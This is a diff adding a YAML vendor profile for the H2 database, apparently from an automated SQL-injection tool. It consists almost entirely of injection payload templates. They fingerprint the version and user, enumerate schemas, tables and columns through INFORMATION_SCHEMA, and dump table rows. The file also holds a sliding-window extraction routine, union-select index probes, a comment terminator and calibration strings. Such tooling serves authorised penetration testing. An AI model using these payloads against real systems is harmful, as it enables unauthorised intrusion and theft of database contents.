@@ -1,0 +1,134 @@
+vendor: ""
+resource: 
+ info: |
+  concat(
+      concat_ws(
+          '${ENCLOSE_VALUE_SQL}',
+          H2VERSION(),
+          database(),
+          user()
+      ),
+      '${TRAIL_SQL}'
+  )
+ schema: 
+  database: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}'
+           || r
+           || '${SEPARATOR_QTE_SQL}'
+           || cast(q as char)
+           || '${ENCLOSE_VALUE_SQL}'
+           order by r
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) from (
+       select
+           cast(schema_name as char) r,
+           count(TABLE_NAME) q
+       from INFORMATION_SCHEMA.tables t
+       right join INFORMATION_SCHEMA.schemata s
+       on t.table_schema = s.schema_name
+       group by r
+       {limit}
+   ) x
+  table: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}'
+           || cast(r as char)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           order by r
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) from (
+       select TABLE_NAME r
+       from information_schema.tables
+       where TABLE_SCHEMA = '${DATABASE}'
+       order by r
+       {limit}
+   ) x
+  column: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}'
+           || cast(n as char)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           order by n
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) from (
+       select COLUMN_NAME n
+       from information_schema.columns
+       where TABLE_SCHEMA = '${DATABASE}'
+       and TABLE_NAME = '${TABLE}'
+       order by n
+       {limit}
+   ) x
+  row: 
+   query: |
+    select concat(
+        group_concat(
+            '${ENCLOSE_VALUE_SQL}'
+            || r
+            || '${SEPARATOR_QTE_SQL}'
+            || cast(q as char)
+            || '${ENCLOSE_VALUE_SQL}'
+            order by r 
+            separator '${SEPARATOR_CELL_SQL}'
+        ),
+        '${TRAIL_SQL}'
+    ) from (
+        select
+            cast(${FIELDS} as char) r,
+            count(*) q
+        from `${DATABASE}`.`${TABLE}`
+        group by r
+        {limit}
+    ) x
+   fields: 
+    field: "trim(ifnull(`${FIELD}`, ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   (
+       select
+           /**
+            * If reach end of string (concat(${LEAD}+NULL)) then concat nullifies the result
+            */
+           concat(
+               '${LEAD}',
+               substr(
+                   (${INJECTION}),
+                   ${INDEX},
+                   /**
+                    * Minus '${LEAD}' should apply
+                    */
+                   ${CAPACITY}
+               )
+           )
+   )
+  limit: "limit ${LIMIT}, 65536"
+  failsafe: "'' || 1337${INDICE}7330%2b1"
+  calibrator: "repeat('${CALIBRATOR_SQL}', 65536)"
+  limitBoundary: 0
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "h2 database"
+ normal: 
+  indices: "union select ${INDICES}"
+  capacity: |
+   (
+       select 
+           concat(
+               '${LEAD}', 
+               ${INDICE}, 
+               ${CALIBRATOR}
+           )
+   )
+  orderBy: "order by 1337"
